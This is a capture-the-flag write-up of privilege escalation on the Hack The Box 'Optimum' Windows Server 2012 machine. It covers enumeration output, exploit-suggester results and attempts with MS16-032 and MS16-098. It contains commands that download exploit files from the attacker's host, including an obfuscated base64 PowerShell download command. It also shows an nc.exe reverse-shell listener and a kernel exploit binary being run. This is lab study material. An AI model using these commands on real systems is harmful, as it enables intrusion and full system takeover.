# Shell as kostas

Firstly I thought it was worth quickly checking for the Administrator flag and for other users on the box:

```cmd
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d----         18/3/2017   1:52 ??            Administrator                                                             
d----         18/3/2017   1:57 ??            kostas                                                                    
d-r--         19/6/2021  10:43 ??            Public                                                                    


PS C:\Users> cd Administrator
PS C:\Users\Administrator> dir
PS C:\Users\Administrator> type root.txt
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator> cd ../Public
PS C:\Users\Public> dir


    Directory: C:\Users\Public


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d-r--         22/8/2013   6:39 ??            Documents                                                                 
d-r--         22/8/2013   6:39 ??            Downloads                                                                 
d-r--         22/8/2013   6:39 ??            Music                                                                     
d-r--         22/8/2013   6:39 ??            Pictures                                                                  
d-r--         22/8/2013   6:39 ??            Videos                                                                    
-a---         19/6/2021  10:43 ??        469 nc.exe                                                                    
-a---         19/6/2021  10:43 ??        325 script.vbs                                                                


PS C:\Users\Public> cd ../Administrator
PS C:\Users\Administrator> dir /a:d
PS C:\Users\Administrator> dir /a:h

```

I could see the `Administrator` directory, but not read it. That's fine, but worth checking.

I did some basic enum:

```cmd
PS C:\Users\kostas\Desktop> whoami /all

USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
optimum\kostas S-1-5-21-605891470-2991919448-81205106-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

But I didn't find anything that useful in the privileges. Next I looked at `systeminfo`:

```cmd
PS C:\Users\kostas\Desktop> systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          19/6/2021, 10:09:40 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.464 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.919 MB
Virtual Memory: In Use:    584 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

## Searching for an Exploit

I ran Windows exploit suggester using this info (I set this up in [[15 - Shell as Network Service#Windows Exploit Suggester|Granny]]):

```bash
┌──(mac㉿kali)-[~/Documents/enum/Windows-Exploit-Suggester]
└─$ python2 windows-exploit-suggester.py --database 2021-05-07-mssb.xls --systeminfo ~/Documents/HTB/optimum/systeminfo 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*] 
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*] 
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*] 
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*] 
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[*] done
```

There were a lot of possible vulns on the list again, so I took a lesson from [[15 - Shell as Network Service|Granny]] and googled the windows version number as well:

![[Pasted image 20210613122211.png]]

Payloads all the things also has a good [list of kernel exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---kernel-exploitation), which seem to be the most common method on these old windows boxes so far:

![[Pasted image 20210613122410.png]]

## Trying MS16-032

We can't use the potato exploits as we don't have either of the necessary privs, but we can look at ms16-032: [https://www.exploit-db.com/exploits/39719](https://www.exploit-db.com/exploits/39719)

As usual, there is a bit of messing about trying to find the correct one and [[15 - Shell as kostas#Attempting File Transfer|transfer the file]], but you can [[15 - Shell as kostas#Final Exploit|skip to the final exploit]] if you wish.

ms16-032 is also on our local box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ searchsploit ms16-032
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Local Privilege Escalation (MS16-032)                                                                               | windows/local/39809.cs
Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Secondary Logon Handle Privilege Escalation (MS16-032) (Metasploit)                                                 | windows/local/40107.rb
Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)                                                               | windows/local/39719.ps1
Microsoft Windows 8.1/10 (x86) - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032)                                                 | windows_x86/local/39574.cs
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

### Attempting File Transfer

I copied it and served it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ searchsploit -m windows/local/39719.ps1
  Exploit: Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)
      URL: https://www.exploit-db.com/exploits/39719
     Path: /usr/share/exploitdb/exploits/windows/local/39719.ps1
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /home/mac/Documents/HTB/optimum/www/39719.ps1


┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ sudo python3 -m http.server 80
[sudo] password for mac: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I tried a couple of powershell commands to download the file to the box:

```cmd
powershell -command "Invoke-WebRequest http://10.10.16.211/exp.ps1 -o exp.ps1"
powershell.exe -command "Invoke-WebRequest http://10.10.16.211/exp.ps1 -o exp.ps1"
```

But neither of them got a hit.

I had a look at the python script, as it successfully executed powershell. It used this syntax:

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand
```

Where the encoded command was generated this way:

```python
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
```

I generated this locally in an interactive python shell:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ python3 
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> command = "Invoke-WebRequest http://10.10.16.211/exp.ps1 -o exp.ps1"
>>> print(base64.b64encode(command.encode("utf-16le")).decode())
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADEAMQAvAGUAeABwAC4AcABzADEAIAAtAG8AIABlAHgAcAAuAHAAcwAxAA==
```

Which means our command should be:

```cmd
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADEAMQAvAGUAeABwAC4AcABzADEAIAAtAG8AIABlAHgAcAAuAHAAcwAxAA==
```

But this also didn't work to download our exploit.

I thought maybe I needed the full path, so went hunting on google: [https://stackoverflow.com/questions/4145232/path-to-powershell-exe-v-2-0](https://stackoverflow.com/questions/4145232/path-to-powershell-exe-v-2-0)

```cmd
PS C:\Windows\System32\WindowsPowershell> dir


    Directory: C:\Windows\System32\WindowsPowershell


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d---s        22/11/2014   7:06 ??            v1.0                                                                      


PS C:\Windows\System32\WindowsPowershell> cd v1.0
PS C:\Windows\System32\WindowsPowershell\v1.0> dir


    Directory: C:\Windows\System32\WindowsPowershell\v1.0


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
...[snip]...

-a---        22/11/2014   3:46 ??     460288 powershell.exe                                                            
...[snip]...    
```

I tried again, but still got nothing:

```cmd
PS C:\Users\kostas\Documents> C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -command "Invoke-WebRequest http://10.10.16.211/39719.ps1 -o exp.ps1"
```

And tried with the encoded command:

```cmd
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADEAMQAvAGUAeABwAC4AcABzADEAIAAtAG8AIABlAHgAcAAuAHAAcwAxAA==
```

But no download.

So, I tried `wget`. To my surprise, it worked:

```cmd
PS C:\Users\kostas\Desktop> wget http://10.10.16.211/39719.ps1


StatusCode        : 200
StatusDescription : OK
Content           : {102, 117, 110, 99...}
RawContent        : HTTP/1.0 200 OK
                    Content-Length: 11829
                    Content-Type: application/octet-stream
                    Date: Sun, 13 Jun 2021 11:40:39 GMT
                    Last-Modified: Sun, 13 Jun 2021 11:26:50 GMT
                    Server: SimpleHTTP/0.6 Python/3.9.2
                    ...
Headers           : {[Content-Length, 11829], [Content-Type, application/octet-stream], [Date, Sun, 13 Jun 2021 11:40:3
                    9 GMT], [Last-Modified, Sun, 13 Jun 2021 11:26:50 GMT]...}
RawContentLength  : 11829

```

I tried to run it:

```cmd
PS C:\Users\kostas\Desktop> C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -noexit "& ""C:\Users\kostas\Desktop\39719.ps1"""
```

This just hung. I re-read the exploit, and it said it only supported powershell 2.0.

However, I noticed I seemed to be *in* a powershell shell (denoted by the `PS` shell prompt). I tested this:

```cmd
PS C:\Users\kostas\Desktop> Invoke-WebRequest http://10.10.16.211/test
```

And suddenly it worked!

![[Pasted image 20210613124656.png]]

I guess trying to run powershell.exe inside a powershell prompt was messing things up.

### Trying the Exploit

Trying to run the script within this prompt didn't hang, but it didn't escalate our privileges either:

```cmd
PS C:\Users\kostas\Desktop> 39719.ps1
PS C:\Users\kostas\Desktop> .\39719.ps1
PS C:\Users\kostas\Desktop> whoami
optimum\kostas
```

I tried the next one in the list: [https://www.exploit-db.com/exploits/41020/](https://www.exploit-db.com/exploits/41020/), which actually had a precompiled binary: [https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe)

I got it downloaded to the box, but it wouldn't execute:

```cmd
PS C:\Users\kostas\Desktop> Invoke-WebRequest http://10.10.16.211/exp.exe -Outfile exp.exe
PS C:\Users\kostas\Desktop> dir


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---         20/6/2021  12:20 ??     560128 exp.exe                                                                   
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
-ar--         18/3/2017   2:13 ??         32 user.txt.txt                                                              


PS C:\Users\kostas\Desktop> exp.exe
PS C:\Users\kostas\Desktop> C:\Users\kostas\Desktop\exp.exe
whoami
^C
```

I tried again with a fresh shell:

```cmd
listening on [any] 413 ...
connect to [10.10.16.211] from (UNKNOWN) [10.10.10.8] 49184
whoami
optimum\kostas
PS C:\Users\kostas\Desktop> & "C:\Users\kostas\Desktop\exp.exe"
````

But no luck.

## Getting a Better Shell

I tried fixing the shell I couldn't get working earlier. I copied across an `nc.exe` binary and hosted it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ locate nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .
┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ sudo python3 -m http.server 80
[sudo] password for mac: 
Sorry, try again.
[sudo] password for mac: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I ran the exploit again:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ python2 39161.py 10.10.10.8 80
```

And after 30 seconds or so I got a hit!

![[Pasted image 20210613135029.png]]

## Final Exploit

Now I had to try and run my exploit again. Just `exp.exe` didn't work, but specifying the full path did:

![[Pasted image 20210613135104.png]]

That's the box!

![[Pasted image 20210613134757.png]]